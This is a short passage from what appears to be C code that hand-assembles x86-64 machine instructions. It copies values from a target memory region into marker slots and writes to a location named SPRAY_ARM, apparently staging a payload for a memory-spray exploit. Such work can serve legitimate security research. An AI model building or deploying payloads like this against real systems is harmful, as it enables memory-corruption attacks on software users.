	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 64u);
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 72u);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 18u);
